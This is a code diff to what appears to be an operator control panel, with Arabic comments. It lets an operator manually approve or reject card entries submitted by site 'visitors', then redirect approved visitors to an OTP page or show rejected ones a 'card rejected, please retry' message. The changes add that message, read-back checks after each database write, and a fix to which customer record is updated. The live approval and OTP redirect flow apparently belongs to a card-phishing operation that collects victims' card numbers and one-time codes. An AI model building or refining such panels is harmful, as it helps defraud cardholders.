@@ -1235,9 +1235,11 @@
     return {
       decision: decision,
       status: decision,
+      // هذه هي الحقول التي يراقبها تطبيق موقع العملاء الأصلي مباشرة.
       cardStatus: decision === 'approved' ? 'approved_with_otp' : 'rejected',
       otpStatus: decision === 'approved' ? 'show_otp' : null,
       redirectPage: decision === 'approved' ? 'otp' : null,
+      rejectionMessage: decision === 'rejected' ? 'تم رفض البطاقة من قبل المدير، يرجى إعادة المحاولة.' : '',
       redirectRequestedAt: firebase.firestore.FieldValue.serverTimestamp(),
       decidedAt: firebase.firestore.FieldValue.serverTimestamp(),
       updatedAt: firebase.firestore.FieldValue.serverTimestamp(),
@@ -1252,6 +1254,8 @@
       const docId = n ? n.id : id;
       if (!docId) { toast('تعذّر تحديد الطلب', 'error'); return; }
       await db.collection('pays').doc(docId).set(decisionPayload(decision), { merge: true });
+      const check = await db.collection('pays').doc(docId).get();
+      if (!check.exists || check.data().cardStatus !== (decision === 'approved' ? 'approved_with_otp' : 'rejected')) throw new Error('لم يتم تأكيد تحديث وثيقة العميل');
       toast(decision === 'approved' ? 'تمت الموافقة بنجاح' : 'تم الرفض', decision === 'approved' ? 'success' : 'error');
     } catch (err) {
       console.error('setDecision error:', err);
@@ -1274,8 +1278,11 @@
         }
       }
       // cardId يخص محاولة البطاقة داخل history؛ يجب تحديث وثيقة pays الخاصة بالعميل.
-      const docId = sessionId || cardId;
+      const docId = visitor.id || sessionId;
+      if (!docId) throw new Error('معرّف وثيقة pays غير موجود');
       await db.collection('pays').doc(docId).set(decisionPayload(decision), { merge: true });
+      const check = await db.collection('pays').doc(docId).get();
+      if (!check.exists) throw new Error('لم يتم العثور على وثيقة العميل بعد التحديث');
       toast(decision === 'approved' ? 'تمت الموافقة بنجاح' : 'تم الرفض', decision === 'approved' ? 'success' : 'error');
     } catch (err) {
       console.error('setCardDecision error:', err);
